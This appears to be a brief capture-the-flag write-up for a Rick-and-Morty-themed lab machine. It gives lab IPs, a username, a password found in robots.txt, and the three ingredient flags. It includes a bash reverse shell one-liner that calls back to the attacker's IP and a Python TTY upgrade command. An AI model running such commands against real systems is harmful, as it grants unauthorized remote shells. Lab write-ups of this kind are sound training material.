### MY IP: 10.18.15.191
### Machine IP: 10.10.206.183


**Username Found: R1ckRul3s**

**Robots.txt**
```
Wubbalubbadubdub
```

so the text in robots.txt was the password for the login page at: http://10.10.233.12/login.php

**Reverse Shell**
```bash
bash -c 'exec bash -i &>/dev/tcp/10.18.15.191/4444 <&1'
```

**TTY Shell**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Ingredient 1: mr. meeseek hair
### Ingredient 2: 1 jerry tear
### Ingredient 3: fleeb juice

This machine was very easy. No need for any priv esc as we had root access without need for any password :)
Spent a couple mins looking up vulns for stuff that wasnt even there and had to reboot machine a couple of times due to it freezing.